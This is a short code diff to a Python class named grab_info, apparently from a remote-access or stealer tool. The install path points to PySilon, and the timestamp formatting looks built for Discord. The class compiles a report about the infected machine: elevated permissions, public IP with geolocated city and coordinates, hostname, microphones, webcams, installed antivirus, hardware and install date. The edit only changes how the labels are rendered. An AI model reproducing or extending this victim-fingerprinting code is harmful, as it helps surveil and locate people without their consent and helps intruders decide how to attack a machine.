@@ -20,23 +20,22 @@ class grab_info:
         info = self.get_info()
         return f'''
 > **»** Started at:  **<t:{info['start_time']}:f>**
-> **»** Elevated permissions:  **`{info['is_admin']}`**
-> **»** IP:  **`{info['ip']}`**
+> **»** {render_text('Elevated')} permissions:  **`{info['is_admin']}`**
+> **»** {render_text('IP')}:  **`{info['ip']}`**
 > **»** Country:  **`{info['country']}`**
 > **»** City:  **`{info['city']}`**
 > **»** Latitude:  **`{info['latitude']}`**
 > **»** Longitude:  **`{info['longitude']}`**
-> **»** Hostname:  **`{info['host_name']}`**
+> **»** {render_text('Hostname')}:  **`{info['host_name']}`**
 > **»** OS:  **`Windows {info['release']}`**
-> **»** Microphones:  **`{info['microphones']}`**
-> **»** Webcams:  **`{info['webcams']}`**
+> **»** {render_text('Microphones')}:  **`{info['microphones']}`**
+> **»** {render_text('Webcams')}:  **`{info['webcams']}`**
 > **»** Monitors:  **`{info['monitors']}`**
-> **»** Antivirus:  **`{', '.join(info['antivirus']) if isinstance(info['antivirus'], list) else info['antivirus']}`**
-> **»** CPU:  **`{info['cpu']}`**
-> **»** GPU:  **`{', '.join(info['gpu']) if isinstance(info['gpu'], list) else info['gpu']}`**
-> **»** RAM:  **`{info['ram']}`**
-> **»** Install Date:  **`{info['install_date']}`**
-> **»** Installed at:  **`C:/Users/warga/PySilonDir/.`**'''
+> **»** {render_text('Antivirus')}:  **`{', '.join(info['antivirus']) if isinstance(info['antivirus'], list) else info['antivirus']}`**
+> **»** {render_text('CPU')}:  **`{info['cpu']}`**
+> **»** {render_text('GPU')}:  **`{', '.join(info['gpu']) if isinstance(info['gpu'], list) else info['gpu']}`**
+> **»** {render_text('RAM')}:  **`{info['ram']}`**
+> **»** Install Date:  **`{info['install_date']}`**'''
 
     def get_ip_info(self, ip):
         try: return json.loads(requests.get(f'https://geolocation-db.com/jsonp/{ip}').content.decode().split("(")[1].strip(")"))
